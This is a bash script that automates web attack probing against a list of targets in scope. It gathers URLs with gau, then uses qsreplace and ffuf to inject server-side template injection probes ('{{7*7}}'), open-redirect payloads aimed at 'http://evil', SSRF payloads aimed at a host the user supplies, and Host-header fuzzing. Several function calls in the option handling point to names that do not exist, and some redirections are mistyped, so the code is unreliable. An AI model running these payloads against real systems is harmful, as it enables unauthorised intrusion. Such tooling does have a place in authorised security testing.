#!/bin/bash

function create_wl(){
        mkdir -p url
        cd url
        #get urls
        #cat ../scope |waybackurls |tee -a url
        cat ../scope |gau -subs |tee -a url
        cat url |sort -u -o url
	cat url |grep -viE "(jpg|jpej|gif|css|tif|tiff|png|ttf|woff|woff2|ico|svg)$" |sort -u -o url 
        #get url with parameters
        cat url |grep  "=" |tee -a url.param
	cat url |unfurl -u paths
}


function verify(){
	if [ ! -d url ];then 
		rm -rf url url.param 2&> /dev/null	
	       	create_wl
	elif [ -f ./url/url.param ];then
		cd url
		cat url |grep  "="  > url.param
	fi
}

function ssti(){
	verify
	#create ssti template
	rm -rf url.ssti 2&> /dev/null
        cat url.param |qsreplace "ssti{{7*7}}" |tee -a url.ssti
        cat url.ssti |sort -u -o url.ssti
        ffuf -u FUZZ -w url.ssti  -t 30  -mr "ssti49"  -o  ssti.result
}

function open_redirect(){
	verify
	rm -rf url.redirect 2&> /dev/null
	#create open redirect template
        cat url.param |qsreplace "http://evil"  |tee -a url.redirect
        cat url.redirect |sort -u -o url.redirect	
	ffuf -u FUZZ -w url.redirect  -t 30  -mr "evil.com"  -o  open_redirect.result
}

function ssrf(){
	verify
	rm -rf url.ssrf 2&> /dev/null
	#create ssrf template
        cat url.param |qsreplace "http://$1"  |tee -a url.ssrf
        cat url.ssrf |sort -u -o url.ssrf
	ffuf -u FUZZ -w url.ssrf -t 30 -o  ssrf.result
}

function host(){
        #create ssrf template
        ffuf -u FUZZ -w ./url  -H "Host: $1"  -t 30 -o  ssrf.result
}
function help(){
echo "usage:"
echo -e "\t s \t ssrf (require)"
echo -e "\t t \t ssti"
echo -e "\t o \t open redirect"
}


while getopts ":s:H:to" OPTION
do
        case $OPTION in
                s)
                        ssrf "$OPTARG"
                        ;;
                H)
                        Host "$OPTARG"
                        ;;
                t)
                        ssti
			exit 1
                        ;;
		o)
                        open.redirect
                        exit 1
                        ;;

                :)
                        help
                        exit 1
                        ;;
                \?)
                        help
                        exit 1
                        ;;

        esac
done


